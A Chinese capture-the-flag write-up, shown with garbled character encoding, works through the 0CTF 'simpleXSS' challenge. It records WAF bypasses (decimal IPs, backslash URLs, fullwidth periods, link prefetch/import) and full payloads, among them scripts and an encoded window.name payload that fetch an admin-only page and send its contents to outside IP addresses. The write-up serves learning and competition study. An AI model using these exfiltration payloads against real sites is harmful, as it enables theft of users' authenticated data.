è¿™é¢˜çš„é€»è¾‘ä¸»è¦æ˜¯ï¼Œä¼šæœ‰ä¸€ä¸ªpreviewé¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ¥æµ‹è¯•æˆ‘ä»¬çš„xss payloadçš„æ‰§è¡Œæƒ…å†µï¼Œç„¶åflagè—åœ¨https://router.vip/flag.phpé¡µé¢ã€‚https://router.vip/flag.phpåªå…è®¸adminè®¿é—®ã€‚æˆ‘ä»¬éœ€è¦é€šè¿‡XSSå»æ§åˆ¶adminè®¿é—®flag.phpï¼Œç„¶åå†æŠŠæ•°æ®å¼¹å›æ¥ã€‚

fuzzäº†ä¸€æ³¢ï¼Œwafç®€ç›´äº†ã€‚ã€‚

èƒ½ç”¨çš„ç¬¦å·ï¼š

```
a-zA-Z ~|_^\=<-+*
```

å› ä¸ºæˆ‘ä»¬æ²¡æœ‰:å’Œ.å·ï¼Œæ‰€ä»¥éœ€è¦æ‰¾æ€è·¯ç»•è¿‡

åæ¥ï¼Œlouysç¿»ç¬”è®°ç¿»åˆ°äº†ä¸€ä¸ªæ€è·¯ï¼š

![url](http://momomoxiaoxi.com/img/post/0ctf/url.png)



ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå½“ä¸‹ä½¿ç”¨çš„æ˜¯https:// é‚£ä¹ˆæˆ‘ä»¬src=\\\ï¼ˆ10è¿›åˆ¶çš„ipï¼‰å°±å¯ä»¥ç»•è¿‡

Ip_change.py

```python
import socket
import struct
import sys

ip = sys.argv[1]
#print ip
int_ip = socket.ntohl(struct.unpack('I',socket.inet_aton(ip))[0])
print int_ip
```



æµ‹è¯•äº†ä¸€æ³¢ï¼Œå‘ç°

```html

<html>
<head>
    <meta charset="utf-8">
    <title>XSS Test Page</title>
</head>
<body>
<p>

            <script src=\\1759553882

</p>
</body>
```

ç¡®å®å¯ä»¥å¾€å¤–å‘æ•°æ®

![script](http://momomoxiaoxi.com/img/post/0ctf/script.png)

å› ä¸ºæˆ‘ä»¬æ²¡æœ‰.å·ï¼Œæ‰€ä»¥ä¹Ÿä¸èƒ½å¼•ç”¨ç±»ä¼¼104.224.169.90/a.jsè¿™ç§ç•Œé¢

ç„¶åï¼Œå°±è€ƒè™‘index.htmlè¿™ç§ç‰¹æ€§ã€‚æˆ‘ä»¬å¼•ç”¨ä¸€ä¸ª104.224.169.90çš„é¡µé¢ï¼Œå®ƒä¼šè‡ªåŠ¨è¡¥å…¨åˆ°è¾¾index.html(è¿™ç§è¡¥å…¨å’ŒæœåŠ¡å™¨çš„ç›¸å…³è®¾ç½®ç›¸å…³ï¼Œä½ ä»¬æ‡‚å¾—)

é‚£ä¹ˆï¼Œæˆ‘ä»¬ç°åœ¨å°±èƒ½å¾€å¤–å¼•ç”¨æ•°æ®äº†ï¼

ä½†æ˜¯ï¼Œåæ¥æµ‹è¯•å‘ç°

```Js
<script src=\\2131121
```

è¿™ç§æ ¼å¼çš„å¼•ç”¨ï¼Œæµè§ˆå™¨åªæ˜¯åšäº†ä¸€ä¸ªgetè¯·æ±‚ï¼Œä½†æ˜¯å› ä¸ºæ²¡æœ‰å³æ ‡ç­¾ï¼Ÿï¼Ÿï¼ˆå…·ä½“åŸå› æ²¡æ·±å…¥ç ”ç©¶ï¼‰ï¼Œå®ƒæ²¡æœ‰å¯¹é‡Œé¢çš„jsè¿›è¡Œè§£ææ‰§è¡Œã€‚

ç„¶åï¼Œåˆæµ‹è¯•äº†å‡ ä¸ªå…¶ä»–çš„æ ‡ç­¾ï¼Œå‘ç°iframeçœŸæ˜¯ä¸€ä¸ªç¥å¥‡çš„æ ‡ç­¾ã€‚

æˆ‘ä»¬å¯ä»¥é€šè¿‡

```html

<html>
<head>
    <meta charset="utf-8">
    <title>XSS Test Page</title>
</head>
<body>
<p>

            <iframe src=\\1759553882

</p>
</body>
```

è¿™ç§å½¢å¼å»å¼•ç”¨ä¸€ä¸ªhttps://ip/index.htmlçš„æ•°æ®ï¼Œè€Œä¸”å®ƒèƒ½å¯¹index.htmlçš„jsè¿›è¡Œè§£ææ‰§è¡Œï¼

æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯ï¼Œè®©adminè§¦å‘xssï¼ŒiframeåŠ è½½ä¸€ä¸ªé¡µé¢ï¼Œé¡µé¢ä¸­çš„jsæ‰§è¡Œï¼Œè®¿é—®flag.phpï¼Œç„¶åå†æŠŠæ•°æ®æ‰“åˆ°æˆ‘ä»¬çš„VPSä¸­ã€‚

Index.htmlé¡µé¢å¦‚ä¸‹

```html
<html>
<head>
</head>
<script>


/**
 * Created by moxiaoxi on 2017/3/20.
 */
function getinfo(str) {
    var node=document.createElement("script");
    node.type="text/javascript";
    node.src="http://104.224.169.90:6789/"+escape(str);
    document.getElementsByTagName("HEAD")[0].appendChild(node);
}

var xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET","https://router.vip/flag.php",true);
xmlhttp.onreadystatechange=function()
{
    //if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        getinfo(xmlhttp.responseText);
    }
}
xmlhttp.send();


</script>
</html>
```

å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨æ‰§è¡Œäº†js

![xss1](http://momomoxiaoxi.com/img/post/0ctf/xss1.png)

ä½†ï¼Œæ­¤æ—¶æˆ‘ä»¬çš„VPSæ˜¯æ”¶ä¸åˆ°çš„æ•°æ®çš„ï¼Œå› ä¸ºå‘é€è¯·æ±‚è¢«Chromeæ‹¦æˆªä¸‹æ¥äº†

```
Mixed Content: The page at 'https://router.vip/preview.php' was loaded over HTTPS, but requested an insecure script 'http://104.224.169.90:6789/'. This request has been blocked; the content must be served over HTTPS.
```

httpsåŠ è½½srcä¸€ä¸ªhttpçš„é¡µé¢ï¼Œå®ƒä¼šè‡ªåŠ¨æ‹¦æˆªæ‰ã€‚

æ‰€ä»¥ï¼Œæˆ‘ä»¬æŠŠå‰é¢çš„httpæ”¹æˆhttpså³å¯ï¼ˆæ³¨ï¼šè¿™æ ·ä¼šå¯¼è‡´æ•°æ®ä¹±ç ï¼Œå½“æ—¶ä¸»è¦æƒ³æµ‹èƒ½ä¸èƒ½å¼¹æ•°æ®ï¼‰

æ­¤æ—¶å¯ä»¥åœ¨æˆ‘ä»¬çš„VPSä¸Šçœ‹åˆ°æ•°æ®ï¼š

![shell1](http://momomoxiaoxi.com/img/post/0ctf/shell1.png)

è¯´æ˜ï¼Œç°åœ¨å‘é€æ•°æ®è¿™ä¸ªåŠŸèƒ½æ˜¯æˆåŠŸçš„ã€‚(å…¶å®ï¼Œè¿™é‡Œæ²¡æœ‰è·å–åˆ°æ•°æ®ï¼Œåªæ˜¯httpsåè®®çš„ä¸€äº›ä¹±ç æ•°æ®)

ä½†æ˜¯ï¼Œä¸ºä»€ä¹ˆç°åœ¨æ²¡æœ‰å¼¹å‡ºçœŸæ­£çš„flagå‘¢ï¼Œå› ä¸ºiframeè¿™ç§æ–¹å¼ä¼šæ–°å»ºä¸€ä¸ªå±‚ï¼Œè¿™æ ·å°±ä¸å†åœ¨ä¸€ä¸ªæºä¸Šäº†ã€‚

```
XMLHttpRequest cannot load https://router.vip/flag.php. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'https://104.224.169.90' is therefore not allowed access.
```

chromeä¼šæŠ¥è¿™ä¸ªé”™ã€‚æ¢³ç†ä¸€ä¸‹ç°åœ¨çš„é€»è¾‘ï¼Œæˆ‘ä»¬åœ¨preivewé¡µé¢ï¼Œè®©å…¶iframeå¼•ç”¨ä¸€ä¸ªhtmlï¼Œç„¶åæ‰§è¡Œhtmlçš„é‡Œé¢çš„jsï¼Œjsä¸­å¯¹https://router.vip/flag.phpå‘é€è¯·æ±‚ã€‚ä½†æ˜¯ï¼Œå› ä¸ºrouter.vip/flag.phpçš„å¤´æ²¡æœ‰è®¾ç½®è·¨åŸŸèµ„æºå…±äº«ã€‚æˆ‘ä»¬ä¹Ÿæ²¡åŠæ³•å»æ§åˆ¶router.vipï¼Œä½¿å…¶å¢åŠ å¤´'Access-Control-Allow-Origin' '*';

**æ‰€ä»¥ï¼Œè¿™é‡Œå°±ggäº†ã€‚ã€‚**

ç„¶åï¼Œæˆ‘ä»¬æƒ³åˆ°äº†å‡ºé¢˜äººåšå®¢ä¸­ï¼Œç«æ—¥å¤§ä½¬çš„é‚£ç§æ€è·¯ï¼Œä¸¤ä¸ªiframeäº’ç›¸é€šä¿¡ï¼Œå°±æ˜¯å‰é¢é¢˜ç›®çš„æ€è·¯ã€‚

ç”¨ä¸€ä¸ªiframeå»è§¦å‘xssï¼Œæ–°å»ºä¸€ä¸ªiframeï¼ŒåŠ è½½æˆ‘ä»¬VPSçš„index.html.

index.html,æœ‰ä¸¤ä¸ªiframeï¼Œç¬¬ä¸€ä¸ªiframeè®¿é—®flag.php,ç¬¬äºŒä¸ªé¡µé¢iframeè®¿é—®previewé¡µé¢ï¼ŒåŒæ—¶å¾€previewæ„é€ ä¸€ä¸ªè¡¨å•è§¦å‘xssï¼Œè®©å…¶å†iframeä¸€ä¸ªVPSçš„æ•°æ®ã€‚ã€‚ã€‚è¯´èµ·æ¥å¥½æ··ä¹±

ä¸Šä»£ç ï¼š

index.html

```html
<html>
<head>
</head>
<body>
<iframe id='1' src='https://router.vip/flag.php'>
</iframe>

<form id="exploit" action="https://router.vip/preview.php" method="POST" target="profile">
    <input name="payload" type="hidden" value="<iframe src=\\3396350939">
</form>

<iframe id='2' name="profile" src='https://router.vip/preview.php'>
</iframe>
<script>document.getElementById('exploit').submit();</script>
</body>
</html>
```

ç„¶åï¼Œåœ¨å¦å¤–ä¸€ä¸ªVPSï¼ˆ3396350939ï¼‰ä¸Šå»æ˜¾ç¤ºå‰ä¸€ä¸ªiframeçš„æ•°æ®

å…¶å®è¿™æ ·è¿˜æ˜¯è¿ååŒæºçš„ï¼Œä¸»è¦è¿™é‡Œè¿˜æ˜¯ç”¨iframeè¿™ä¸ªæ ‡ç­¾è§¦å‘ã€‚ã€‚ã€‚å¯¼è‡´ï¼Œä¼šæ–°ç”Ÿæˆä¸€ä¸ªæºå’Œæœ¬æ¥çš„ä¸ä¸€æ ·ã€‚

ç”»äº†ä¸ªè‰å›¾ï¼š

![origin1](http://momomoxiaoxi.com/img/post/0ctf/origin1.png)

æ•´ä¸ªé€»è¾‘å°±æ˜¯è¿™æ ·ï¼Œå› ä¸ºiframeä¼šç”Ÿæˆä¸€ä¸ªæºï¼Œiframe1ï¼Œiframe2ä¹‹æ‰€ä»¥åŒæºæ˜¯å› ä¸ºä»–ä»¬ä¸¤åœ¨åŒä¸€ä¸ªåŸŸã€‚

å›é¡¾33c3çš„é¢˜ **yolovault**

é¢˜ç›®å†…å®¹å‚è€ƒè¿™ä¸¤ä¸ªåšå®¢ï¼š

1.   [http://blog.csdn.net/qq_19876131/article/details/54097284](http://blog.csdn.net/qq_19876131/article/details/54097284)

2. [http://5alt.me/2017/01/%E5%9F%BA%E4%BA%8Ecsv%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%B7%B2%E6%AD%BB/](http://5alt.me/2017/01/%E5%9F%BA%E4%BA%8Ecsv%E7%9A%84%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%B7%B2%E6%AD%BB/)

   â€‹

å®ƒåªæ‰€ä»¥æ²¡è¿ååŒæºï¼Œæ˜¯å› ä¸ºå®ƒæ˜¯åŠ è½½ä¸€ä¸ªjsï¼Œè€Œéiframeï¼Œçœ‹å›¾

![origin2](http://momomoxiaoxi.com/img/post/0ctf/origin2.png)

æ•´ä¸ªåšé¢˜è¿‡ç¨‹çš„æ€è·¯ï¼Œå°±æ­»åœ¨è¿™äº†ã€‚æ„Ÿè§‰ç°åœ¨åªèƒ½åšåˆ°è®¿é—®flag.phpï¼Œä½†æ˜¯æ²¡åŠæ³•æŠŠæ•°æ®æ‰“å‡ºæ¥ã€‚

æ„Ÿè§‰æˆä¹Ÿiframeï¼Œè´¥ä¹ŸiframeğŸ˜­

> è®°å½•ä¸€ä¸‹è‡ªé—­åˆæ ‡ç­¾ï¼š
>
>  `<img><br><hr><link><area/> <base/> <input /> <!-- -->`

#### HTML5 Prefetch

æœ¬é¢˜æ­£ç¡®çš„è§£ç­”åº”è¯¥æ˜¯åˆ©ç”¨chromeçš„é¢„åŠ è½½æœºåˆ¶æ¥ç»•è¿‡CSP

[Prefetchæ ‡ç­¾å­¦ä¹ ](http://www.jianshu.com/p/7f58ddfc1392)

[åˆ©ç”¨DNSé¢„è¯»å–æŠ€æœ¯ç»•è¿‡CSP](http://bobao.360.cn/learning/detail/3140.html)

[Bypass unsafe-inline mode CSP](http://paper.seebug.org/91/)

[é‚£äº›å¹´æˆ‘ä»¬ç»•è¿‡çš„CSP](http://heartsky.info/2017/03/03/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E7%BB%95%E8%BF%87%E7%9A%84CSP/)

ç±»ä¼¼è¿™ç§å½¢å¼ï¼š

```

<link rel=import href=\\qqã€‚com

<link rel=import href=\\1759553882
```



è‡³äºprerenderã€prefetchï¼Œæœ‰çœ‹åˆ°é¢˜è§£è¯´ï¼Œå¯ä»¥ã€‚ä½†æ˜¯ï¼Œæˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œæ•ˆæœä¸æ˜¯å¾ˆå¥½ã€‚

è®°å½•ä¸‹ç»“æœï¼š

```html
<link rel=import href=\\wwwã€‚xxã€‚net å¥½ç”¨
<link rel=prefetch href=\\wwwã€‚xxã€‚net è®¿é—®äº†ï¼Œä½†æ˜¯æ”¶ä¸åˆ°æ•°æ®
<link rel=prerender href=\\wwwã€‚xxã€‚net æ— æ³•è®¿é—®
```





#### CORSçš„å‘

ä½¿ç”¨`<link rel=import href=\\1759553882`è¿›è¡Œæµ‹è¯•çš„æ—¶å€™ï¼Œä¼šè¢«chromeæ‹¦æˆªã€‚

```url
Access to Imported resource at 'https://104.224.169.90/' from origin 'https://router.vip' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'https://router.vip' is therefore not allowed access.
```

è¿™æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„æœåŠ¡å™¨æ²¡æœ‰è®¾å®šAccess-Control-Allow-Originï¼Œå¯¼è‡´æ²¡åŠæ³•è®¿é—®ã€‚

èµ„æ–™å¯ä»¥å‚è€ƒ

[è·¨åŸŸèµ„æºå…±äº« CORS è¯¦è§£](http://www.ruanyifeng.com/blog/2016/04/cors.html)

[https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS)

æˆ‘ä»¬ä¿®æ”¹æœ¬æ¥çš„index.html

```

<html>
<meta http-equiv="Access-Control-Allow-Origin" content="*">
<head>
</head>
<script>

/**
 * Created by moxiaoxi on 2017/3/20.
 */
function getinfo(str) {
    var node=document.createElement("script");
    node.type="text/javascript";
    node.src="http://104.224.169.90:6789/"+escape(str);
    document.getElementsByTagName("HEAD")[0].appendChild(node);
}

var xmlhttp=new XMLHttpRequest();
xmlhttp.open("GET","https://router.vip/flag.php",true);
xmlhttp.onreadystatechange=function()
{
    //if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        getinfo(xmlhttp.responseText);
    }
}
xmlhttp.send();


</script>
</html>
```

å¯æ˜¯è¿™æ ·è®¾ç½®äº†ï¼Œè¿˜æ˜¯æ²¡ç”¨ï¼Œä¸çŸ¥é“è¿™æ ·ä¸ºå•¥ä¼šå¤±è´¥ï¼Ÿã€‚ã€‚

æœ€åï¼Œä¿®æ”¹äº†nginxçš„é…ç½®

```
    location / {
    add_header 'Access-Control-Allow-Origin' '*';
	add_header 'Access-Control-Allow-Credentials' 'true';
	add_header 'Access-Control-Allow-Headers' 'Authorization,Content-	Type,Accept,Origin,User-Agent,DNT,Cache-Control,X-Mx-ReqToken,X-Requested-With';
	add_header 'Access-Control-Allow-Methods' 'GET,POST,OPTIONS';
    }
```

æ­¤æ—¶ï¼Œå¯ä»¥æ­£ç¡®åŠ è½½ã€‚

![cosp](http://momomoxiaoxi.com/img/post/0ctf/cosp.png)

#### HTTPçš„å‘

è¿™ä¸ªå‰é¢è®²è¿‡ï¼Œåœ¨æ¯”èµ›æœŸé—´é‡åˆ°çš„ï¼ŒHTTPS srcåŠ è½½HTTPçš„é—®é¢˜ã€‚

```
(index):15 Mixed Content: The page at 'https://router.vip/preview.php' was loaded over HTTPS, but requested an insecure script 'http://104.224.169.90:6789/'. This request has been blocked; the content must be served over HTTPS.
getinfo @ (index):15
xmlhttp.onreadystatechange @ (index):24
2(index):15 Mixed Content: The page at 'https://router.vip/preview.php' was loaded over HTTPS, but requested an insecure script 'http://104.224.169.90:6789/Only%20ip%20from%20this%20host%20is%20allowed'. This request has been blocked; the content must be served over HTTPS.
getinfo @ (index):15
xmlhttp.onreadystatechange @ (index):24
```

chromeæ˜¾ç¤ºæˆ‘ä»¬ä»httpsè·³åˆ°äº†httpé˜»æ‹¦äº†ï¼ˆå®è´¨å°±æ˜¯httpsçš„é¡µé¢src httpï¼Œæ˜¯ä¸å…è®¸çš„ï¼Œè¿™ä¹Ÿæ˜¯å‰é¢é€‚ç”¨ `\\`çš„ä¸€ä¸ªéœ€æ±‚ï¼Œè¿™ä¸ªå‰é¢è®²çš„æ€è·¯ä¸­è®²è¿‡ï¼ï¼‰ã€‚å‰æ–‡è®²è¿‡ç›´æ¥æ”¹æˆhttpsä¼šå¯¼è‡´çœ‹ä¸åˆ°æ˜æ–‡æ•°æ®ï¼Œæ‰€ä»¥åªèƒ½æ˜¯HTTPã€‚

æ‰€ä»¥ï¼Œä¿®æ”¹æˆlocation.hrefçš„æ ¼å¼

```html
<html>
<head>
<meta http-equiv="Access-Control-Allow-Origin" content="*">
</head>


<script src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$.get("https://router.vip/flag.php",function(data){
//alert(data);
        location.href="http://104.224.169.90:6789/"+escape(data);
});
</script>


</html>
```

æ­¤æ—¶ï¼Œèƒ½åœ¨VPSä¸Šçœ‹åˆ°æ•°æ®ã€‚



#### IPçš„å‘

åœ¨çœ‹[Melody](http://www.melodia.pw/?p=889#comment-257411)åšå®¢æ—¶ï¼Œå‘ç°ä»–è¯´10è¿›åˆ¶æœ‰ä¸€ä¸ªå‘ã€‚

> è¿™é‡Œæœ‰ä¸€ä¸ª10è¿›åˆ¶çš„å‘ï¼Œå°±æ˜¯å½“æœ‰10è¿›åˆ¶ipçš„æ—¶å€™ï¼Œå¦‚æœç”¨`<link rel=import href=\\1759553882`è¿™ç§æ ¼å¼ï¼Œä¼šè¢«chromeå¹²æ‰ï¼Œæ‰“å¼€ console çœ‹åˆ°æŠ¥é”™æ˜¯ ä¸å®‰å…¨çš„å“åº”ï¼Œå½“å‰é¡µé¢æ˜¯ httpsï¼Œè€Œæˆ‘çš„æœåŠ¡å™¨è™½ç„¶å¼€å¯äº† httpsï¼Œä½†æ˜¯å› ä¸ºè¯ä¹¦æ˜¯ä¸å’Œ ip ç»‘å®šè€Œæ˜¯å’ŒåŸŸåç»‘å®šçš„ï¼Œæ‰€ä»¥æˆ‘éœ€è¦ä½¿ç”¨åŸŸåæ‰èƒ½ç»•è¿‡è¿™ä¸ªé™åˆ¶ã€‚



ä½†æ˜¯ï¼Œæˆ‘åœ¨æµ‹è¯•çš„æ—¶å€™å¹¶æ²¡æœ‰å‘ç°è¿™ä¸ªé—®é¢˜ã€‚åæ¥ï¼Œä¸é˜Ÿå‹è®¨è®ºå’Œæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¾ˆç¥å¥‡!!

è²Œä¼¼æˆ‘çš„chromeæœ‰æ¯’ã€‚ã€‚åªæœ‰å®ƒä¸èƒ½æ‹¦æˆªã€‚åœ¨ubuntuä¸Šæµ‹è¯•äº†ä¸€ä¸‹ï¼Œå’Œåœ¨åˆ«äººçš„macä¸Šæµ‹è¯•äº†ä¸€ä¸‹ï¼Œéƒ½ä¼šé‡åˆ°è¿™ä¸ªå‘ã€‚ã€‚

ä¼°è®¡æˆ‘çš„chromeæœ‰ç‚¹é€†å¤©ğŸ˜‚



#### .å·çš„å¥å·å½¢å¼ç»•è¿‡ 

> æ‰€æœ‰çš„ä¸»æµæµè§ˆå™¨éƒ½æ”¯æŒç”¨ä¸­æ–‡å¥å·æ›¿æ¢åŸŸåéƒ¨åˆ†çš„è‹±æ–‡å¥å·ï¼ŒåŸå› æ˜¯ä¸€äº›ä¸­æ–‡é”®ç›˜æ›´å®¹æ˜“è¾“å…¥ä¸­æ–‡å¥å·......
>
> https://www.zhihu.com/question/45554645

åœ¨åŸŸåï¼ˆåŒ…æ‹¬ipæ ¼å¼ï¼‰éƒ¨åˆ†ï¼Œæµè§ˆå™¨èƒ½æŠŠã€‚è¯†åˆ«æˆ.ï¼Œä¹Ÿå°±æ˜¯è¯´qqã€‚comå¯ä»¥è¯†åˆ«æˆqq.com 192ã€‚168ã€‚1ã€‚1ä¼šæ˜¯è¢«ç§°192.168.1.1  è¿™æ ·å°±å¯ä»¥ç»•è¿‡å‰é¢éƒ¨åˆ†äº†ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªç‰¹æ€§åœ¨urlåé¢å°±å¤±æ•ˆäº†ã€‚æ¯”å¦‚adminã€‚comï¼flagã€‚php å®ƒåªèƒ½è½¬åŒ–æˆadmin.com/flagã€‚php

åŒæ—¶å¯¹äºadmin.com\test.com å®ƒä¹Ÿä¼šè‡ªåŠ¨è½¬æ¢åˆ°admin.com/test.com

ç»“æœå¦‚ä¸‹

æºç ï¼š

```html

<html>
<head>
    <meta charset="utf-8">
    <title>XSS Test Page</title>
</head>
<body>
<p>

            <iframe src=\\104ã€‚224ã€‚169ã€‚90\flagã€‚php

</p>
</body>
```



![juhao](http://momomoxiaoxi.com/img/post/0ctf/juhao.png)

 ```html

<html>
<head>
    <meta charset="utf-8">
    <title>XSS Test Page</title>
</head>
<body>
<p>

            <iframe src=\\routerã€‚vip\flagã€‚php

</p>
</body>
 ```



![juhao2](http://momomoxiaoxi.com/img/post/0ctf/juhao2.png)



æœ€ç»ˆçš„payloadï¼š

 ```html
<link rel=prefetch href=\\testã€‚com
 ```

https://testã€‚com/index.html

```html
<html>
<head>
<meta http-equiv="Access-Control-Allow-Origin" content="*">
</head>


<script src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$.get("https://router.vip/flag.php",function(data){
//alert(data);
        location.href="http://104.224.169.90:6789/"+escape(data);
});
</script>


</html>
```



#### å¥‡ç‰¹çš„æ€è·¯ svg

çœ‹äº†[LCâ†¯BC](https://ctftime.org/team/15726)çš„é¢˜è§£ï¼Œæ€è·¯è¶…çº§çŒ¥çï¼

payload

```
<svg id=\ onload=location=id+id+12345609861+domain+id+1234+id
```

è¿™ä¸ªdomainæ˜¯å–çš„å½“ä¸‹é¡µé¢çš„domainï¼Œä¹Ÿå°±æ˜¯router.vipã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦æ³¨å†Œä¸€ä¸ªxxxxrouter.vipçš„åŸŸåã€‚è¿™ç§æ€è·¯ä¸»è¦æ˜¯å› ä¸º.è¢«è¿‡æ»¤äº†ã€‚ï¼ˆä¿„ç½—æ–¯äººè‚¯å®šä¸çŸ¥é“ã€‚å¯ä»¥è¿‡æ»¤æˆ.2333ä¸­æ–‡çš„å¼ºå¤§ğŸ˜‚ï¼‰

ç„¶åï¼Œåœ¨ https://12345609861router.vip/1234/index.htmlä¸‹å†™äº†ä¸€ä¸ªé¡µé¢ã€‚å°†`<svg onload=location=name`æäº¤ç»™previewï¼Œå®ŒæˆäºŒæ¬¡xssè§¦å‘ã€‚å®ƒä¼šæ‰§è¡Œwindow.nameä¸­çš„ä¸œè¥¿ï¼Œå‘é€ä¸€ä¸ªgetè¯·æ±‚ï¼Œå¹¶æŠŠæ•°æ®å¼¹å›æ¥

```html
<html>
  <body>
    <form id="send" action="https://router.vip/preview.php?" method="POST">
      <input type="hidden" name="task" value="" />
      <input type="hidden" name="payload" value="&lt;svg&#32;onload&#61;location&#61;name" />
      <input type="hidden" name="geetest&#95;challenge" value="" />
      <input type="hidden" name="geetest&#95;validate" value="" />
      <input type="hidden" name="geetest&#95;seccode" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
    window.name = "javascript:%76%61%72%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%78%68%72%2e%6f%70%65%6e%28%27%47%45%54%27%2c%20%27%68%74%74%70%73%3a%2f%2f%72%6f%75%74%65%72%2e%76%69%70%2f%66%6c%61%67%2e%70%68%70%27%2c%20%66%61%6c%73%65%29%3b%0a%78%68%72%2e%73%65%6e%64%28%29%3b%0a%69%66%20%28%78%68%72%2e%73%74%61%74%75%73%20%3d%3d%20%32%30%30%29%20%7b%0a%20%20%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%31%32%33%34%35%36%30%39%38%36%31%72%6f%75%74%65%72%2e%76%69%70%2f%31%32%33%34%2f%3f%72%65%73%75%6c%74%3d%27%2b%78%68%72%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%0a%7d";
    document.getElementById("send").submit();
    </script>
  </body>
</html>
```

ä¼ªåè®®è§£ç 

```Js
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://router.vip/flag.php', false);
xhr.send();
if (xhr.status == 200) {
  location='https://12345609861router.vip/1234/?result='+xhr.responseText;
}
```



ç„¶åå°±èƒ½å¾—åˆ°flagï¼š `flag{th1s_is_fr0m_a_re4l_cas3}`

[WP](https://ctftime.org/writeup/5956)





### å…¶ä»–çš„æ”¶è·

1. å¦‚æœå‘ç°jqueryç”¨ä¸äº†ï¼Œå†™åŸç”Ÿçš„jsåˆå¤ªè›‹ç–¼ï¼Œå¯ä»¥åŠ è½½ä¸€ä¸ªjqueryè¿›æ¥ï¼Œç»§ç»­å¹²ã€‚å½“ç„¶ï¼Œå‰æé‚£ä¸ªé¡µé¢æ˜¯ä½ å¯æ§çš„ã€‚

   ```html
   <script src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
   <script type="text/javascript">
   $.get("https://router.vip/flag.php",function(data){
   //alert(data);
   	location.href="http://119.29.135.206:23333/"+escape(data);
   });
   </script>
   ```

   â€‹

2. åœ¨è°ƒè¯•ç½‘ç»œè¯·æ±‚çš„æ—¶å€™ï¼Œå‘ç°ä¸€æ¬¾chromeæœ‰ä¸€ä¸ªæ›´ç»†å¾®çš„ç½‘ç»œç›‘æ§

   https://segmentfault.com/q/1010000000364871

   ![net-internals](http://momomoxiaoxi.com/img/post/0ctf/net-internals.png)

3. è¿™é‡Œå­¦åˆ°äº†ä¸€ä¸ªburp suiteçš„å°æŠ€å·§

   åŸæ¥burpsuiteå¯ä»¥ç”¨æ¥ç”Ÿæˆè¡¨å•

   ![burp](http://momomoxiaoxi.com/img/post/0ctf/burp.png)

   ![0ctfoscf](http://momomoxiaoxi.com/img/post/0ctf/0ctfoscf.png)

   ç”Ÿæˆajaxæ ¼å¼çš„ï¼ˆç®€ç›´æ˜¯æˆ‘è¿™ç§å¼±æ¸£jsé€‰æ‰‹çš„æ•‘æ˜Ÿï¼‰

   ![ajaxburp](http://momomoxiaoxi.com/img/post/0ctf/ajaxburp.png)

4. èµ›ååŠ¡å¿…å­¦ä¹ WPï¼ŒåŠ¡å¿…å¤ç°WPï¼ŒåŠ¡å¿…æ€»ç»“æ–‡æ¡£ï¼ï¼æ”¶è·å¾ˆå¤šã€‚



### åºŸè¯

è¿™æ¬¡0ctfï¼Œç¬¬ä¸€æ¬¡æ­£å¼ä»¥blue-lotuså‚èµ›ï¼Œé˜Ÿå‹ä»¬éƒ½å¾ˆæ‹¼ã€‚ç¬¬äºŒæ™šï¼Œæˆ‘ä»¬Webç»„ä¸€èµ·æ€¼simpleXSSå¼„åˆ°äº†å°†è¿‘4ç‚¹ï¼Œè€å¸æœºå¤§ä½¬ä»¬3ç‚¹åŠçš„æ—¶å€™ï¼Œè¿˜åœ¨ç»§ç»­æ€¼å„ç§äºŒè¿›åˆ¶ï¼ŒéŸ¦åšçœ‹é‚£ä¸ªOTPæ•´æ•´çœ‹äº†ä¸¤å¤©ï¼Œæ™šä¸Šç¡è§‰è¿˜ä¸€ç›´è®°ç€é‚£é“é¢˜..å®åœ¨è¯ï¼Œæ¯”èµ›æˆ–è®¸æœ€é‡è¦çš„ä¸æ˜¯æœ€åçš„æˆç»©ï¼Œè€Œæ˜¯æœ‰ä¸€ç¾¤é˜Ÿå‹è‚¯é™ªä½ ç–¯ï½

å›é¡¾æ•´åœºæ¯”èµ›ï¼ŒçœŸæ˜¯æ·±æ·±è§‰å¾—è‡ªå·±çš„jsåŠŸåº•å¤ªå·®äº†ï¼Œå¾—å¥½å¥½è¡¥è¡¥ã€‚è¶Šå­¦è¶Šè§‰å¾—è‡ªå·±æ‡‚å¾—ä¸œè¥¿çœŸçš„å¤ªå°‘å¤ªå°‘ï¼Œè¿˜éœ€è¦å­¦ä¹ å¾ˆå¤šå¾ˆå¤šå¥—è·¯orzã€‚

